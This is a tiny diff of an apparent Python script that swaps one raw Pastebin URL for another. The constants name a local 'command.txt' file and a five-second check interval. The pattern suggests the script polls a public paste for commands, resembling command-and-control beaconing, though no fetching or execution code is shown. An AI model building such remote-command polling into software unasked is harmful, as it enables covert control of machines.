@@ -2,7 +2,7 @@ import requests
 import time
 import os
 
-REMOTE_URL = "https://pastebin.com/raw/uX0tGXC7"
+REMOTE_URL = "https://pastebin.com/raw/iGrXJ3yP"
 LOCAL_FILE = "command.txt"
 CHECK_INTERVAL = 5  # 초 단위
 
